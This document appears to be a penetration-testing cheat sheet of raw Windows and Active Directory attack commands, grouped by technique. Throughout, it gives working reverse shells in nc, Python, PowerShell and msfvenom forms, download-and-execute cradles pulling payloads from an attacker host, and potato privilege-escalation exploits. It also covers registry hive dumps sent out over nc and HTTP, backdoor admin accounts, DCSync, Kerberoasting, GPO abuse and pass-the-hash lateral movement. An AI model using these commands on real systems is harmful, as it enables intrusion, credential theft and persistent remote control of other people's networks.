powershell -c "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Microsoft') -and ($_.TaskPath -notmatch 'Microsoft')} | Select-Object TaskName, TaskPath, State, Author"
powershell -c "Get-Service | Where-Object { $_.CanStop -eq $true -and $_.DisplayName -notmatch 'Microsoft|Windows' } | Sort-Object DisplayName"
powershell -c "Import-Module ActiveDirectory"
powershell -c "Get-ADComputer DC1 -property *"
powershell -c "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects"
powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
powershell -c "if ([Environment]::Is64BitOperatingSystem) { '64-bit' } else { '32-bit' }"

+---------- Unquoted Paths ----------+
powershell -c "wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows'"

+---------- Scheduled Tasks ----------+
powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
powershell -c "Start-ScheduledTask -TaskName 'Ownership'"

+---------- Shell From File ----------+
rlwrap nc -lvnp 5555
curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
cmd /c "(echo @echo off & echo C:\ProgramaData\nc.exe -e cmd $MYIP 5555 & echo PAUSE & echo exit) > x.bat"
bat2exe.bat > x.bat > x.exe > C:\programdata\x.exe
C:\programdata\x.exe

+---------- Shell From Memory ----------+
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"

+---------- Other Exploits ----------+
C:\programdata\FullPowers.exe -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5566 -e cmd\"" -z
C:\programdata\SigmaPotato.exe "C:\programdata\nc.exe $MYIP 5566 -e cmd"
C:\programdata\jp32.exe -l 1337 -p "cmd.exe" -a "/c \programdata\nc.exe $MYIP 5678 -e cmd"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
https://ohpe.it/juicy-potato/CLSID/
Windows Server 2008     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
Windows Server 2012     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
Windows Server 2016     {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
Windows 7               {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
Windows 8.1             {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
Windows 10 Enterprise   {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
Windows 10 Pro          {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstaller
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""

+---------- Dump Hashes (Local / Remote)----------+
net user dbf 123qweasdF! /add && net localgroup Administrators dbf /add

cd c:\programdata; reg save hklm\sam sam; reg save hklm\security security; reg save hklm\system system

iwr http://$MYIP:4444 -Method POST -InFile ".\sam"
cmd /c "nc.exe $MYIP 4444 -w 3 < sam"
nc -lvp 4444 > sam
iwr http://$MYIP:4444 -Method POST -InFile ".\security"
cmd /c "nc.exe $MYIP 4444 -w 3 < security"
nc -lvp 4444 > security
iwr http://$MYIP:4444 -Method POST -InFile ".\system"
cmd /c "nc.exe $MYIP 4444 -w 3 < system"
nc -lvp 4444 > system

nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi

impacket-secretsdump -sam sam -system system -security security LOCAL
echo 'Administrator:500:...................' > hashes
hashcat -m 1000 -a 0 hashes $rockyou

powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET

+---------- File Permissions ----------+
powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheritance:e

+---------- Other ----------+
Get-WmiObject -Class Win32_ComputerSystem | Select-Object Domain
Get-ADComputer -Filter * | Select-Object Name
systeminfo | Select-String "Domain"
net view
net group "Domain Computers" /domain
net view /domain
net user /domain
wmic useraccount get name,sid
powershell -c "Set-ExecutionPolicy unrestricted"
services.msc

[*] Meterpreter
+---------- Initial Shell ----------+
64-Bit
msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; set LPORT 8787; setg LHOST $MYIP; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'

32-Bit
msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; set LPORT 8787; setg LHOST $MYIP; set TARGET PSH; setg PAYLOAD windows/meterpreter/reverse_tcp; run'

+---------- Stored Credentials ----------+
run post/windows/gather/credentials/windows_autologin
run post/windows/gather/credentials/gpp
run post/windows/gather/enum_unattend
run post/windows/gather/credentials/enum_cred_store

+---------- Exploit Suggester ----------+
run multi/recon/local_exploit_suggester

+---------- Load Modules ----------+
load kiwi
load powershell

+---------- Initial Checks ----------+
powershell_execute "whoami /user /priv"
powershell_execute "cd \users; tree /a /f"
getsystem
sysinfo
ps
migrate

+---------- Installed Apps ----------+
powershell_execute "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"

+---------- Services and Unquoted Paths ----------+
powershell_execute "Get-Service | Where-Object { $_.CanStop -eq $true -and $_.DisplayName -notmatch 'Microsoft|Windows' } | Sort-Object DisplayName"
powershell_execute "wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows'"

+---------- Scheduled Tasks ----------+
powershell_execute "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Microsoft') -and ($_.TaskPath -notmatch 'Microsoft')} | Select-Object TaskName, TaskPath, State, Author"
powershell_execute "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task; $filePath = $task.Actions.Execute; Get-Acl $filePath | Select-Object PSChildName, PSPath, AccessToString"
powershell_execute "Start-ScheduledTask -TaskName 'Ownership'"

+---------- PowerShell History ----------+
powershell_execute "type (Get-PSReadLineOption).HistorySavePath"

+---------- Network Environment ----------+
powershell_execute "powershell -c \"& { Get-NetTCPConnection -State Listen,Established | Where-Object { `$_."LocalAddress" -notin @('0.0.0.0','127.0.0.1') -and `$_."RemoteAddress" -notmatch '::' } | Sort-Object LocalAddress,LocalPort | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table -AutoSize }\""
powershell_execute "arp -a"
powershell_execute "arp -a -N 10.1.5.4"
powershell_execute "route print"
powershell_execute "ipconfig /all"

+---------- Dumping ----------+
creds_all
hashdump
kiwi_cmd "lsadump::dcsync /domain:$DOM /all /csv"
run post/windows/gather/smart_hashdump
run post/windows/gather/lsa_secrets

+---------- File Permissions ----------+
powershell_execute "(Get-Acl 'C:\secret.txt').Access | Format-Table"
powershell_execute "takeown /f 'C:\secret.txt' && icacls 'C:\secret.txt' /grant %USERNAME%:F /inheritance:e"

+---------- Domain Environment ----------+
run post/windows/gather/enum_ad_users
run post/windows/gather/enum_ad_computers
run post/windows/gather/enum_domain
run post/windows/gather/enum_domains

+---------- Sessions and Jobs ----------+
background
sessions
sessions -i 1
jobs
jobs -k 1

[*] Powerview
Import-Module ./PowerView.ps1

Get-NetDomain
Get-LocalUser

Get-ADuser gpoadm | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}
Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights All
Set-DomainUserPassword -Identity gpoadm -AccountPassword (ConvertTo-SecureString "123qweasdF!" -AsPlainText -Force)

python3 pygpoabuse.py -dc-ip $TARGET $DOM/'gpoadm':'123qweasdF!' -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' -command 'mshta http://10.8.5.79:8080/buqT7ygPVm.hta'
gpoupdate /force

Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET

[*] Shells
+---------- MSFVenom ----------+
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o 0.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o 0.msi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f aspx -o 0.aspx
msfvenom -p php/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.php
msfvenom -p python/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o 0.py

+---------- One Line Reverse Shells ----------+
php -r '$sock=fsockopen("$MYIP",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$MYIP",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
powershell -nop -c "$AtpsZlvw99=New-Object System.Net.Sockets.TCPClient('$MYIP',5555);$DqvVumCJ99=$AtpsZlvw99.GetStream();[byte[]]$bytes=0..65535|ForEach-Object{0};while(($i=$DqvVumCJ99.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$fjVAQFpJ99=(Invoke-Expression $data 2>&1|Out-String);$vpVmHTLx99=$fjVAQFpJ99+'PS '+(Get-Location).Path+'> ';$BaZSdidm99=[System.Text.Encoding]::ASCII.GetBytes($vpVmHTLx99);$DqvVumCJ99.Write($BaZSdidm99,0,$BaZSdidm99.Length);$DqvVumCJ99.Flush()};$AtpsZlvw99.Close()"
powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('$MYIP',5555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"

[*] Rubeus
Rubeus.exe kerberoast
nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=$rockyou --format=krb5tgs
Rubeus.exe asreproast
nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=$rockyou --format=krb5asrep

# Pivoting
## Linux
## Windows
[*] Meterpreter
+---------- Create Route ----------+
run post/multi/manage/autoroute

+---------- Discover Hosts ----------+
run post/windows/gather/enum_domain
run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24 BATCHSIZE=32 THREADS=24

+---------- Port Scan Hosts ----------+
background
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.1.5.3
set PORTS 21,22,23,53,88,135,389,445,1433,2049,3306,3389,5985
set CONCURRENCY 20
set TIMEOUT 20
set THREADS 20

+---------- Setup Socks Proxy ----------+
run auxiliary/server/socks_proxy SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
cp /etc/proxychains.conf /etc/proxychains.conf.backup
echo "socks4 127.0.0.1 9050" >> /etc/proxychains.conf ; nano /etc/proxychains.conf

+---------- Scan Services ----------+
proxychains nmap -Pn -n -sT 10.1.5.3 --open -p 21,22,23,53,88,135,389,445,1433,2049,3306,3389,5985 -g53

+---------- Attacking Internal Hosts ----------+
use exploit/windows/smb/psexec
set LHOST 10.10.10.3
set RHOSTS 10.10.10.1-2
set SMBUser Administrator
set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
run

+---------- Managing Routes ----------+
route
run post/multi/manage/autoroute ACTION=delete
jobs -v
jobs -k 0

+---------- Port Forwarding ----------+
portfwd add -l 65001 -r 10.10.10.1 -p 445
portfwd add -l 65002 -r 10.10.10.2 -p 445
portfwd add -l 65020 -r 10.10.10.20 -p 445
portfwd add -l 65200 -r 10.10.10.200 -p 445
portfwd list
portfwd flush

[*] Manual
arp -a
for /L %i in (1,1,254) do ping -n 1 192.168.1.%i

[*] Pass The Hash
meterpreter> hashdump
DUMP=''
echo "$DUMP" | cut -d ':' -f 1 >> usernames; cat usernames | sort -u | tee usernames
echo "$DUMP" | cut -d ':' -f 3- | sed 's/::.*//' >> hashes; cat hashes | sort -u | tee hashes

+---------- Proxychains ----------+
proxychains nxc smb 10.129.121.240 -u usernames -H hashes -x 'net user sysadm 123qweasdF!'
proxychains nxc smb 10.10.10.1 10.10.10.2 -u usernames -H hashes --local-auth --continue-on-success | grep '\[+\]'
proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam | grep ':[0-9]\+:[a-f0-9]\{32\}:[a-f0-9]\{32\}:::' | awk '{print $NF}'
proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam --lsa --dpapi --ntds
proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth -M reg-winlogon -M lsassy -M powershell_history

+---------- Impacket ----------+
impacket-psexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
impacket-wmiexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
impacket-smbexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET
impacket-atexec -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET "whoami /all"
impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
impacket-wmiexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
impacket-smbexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
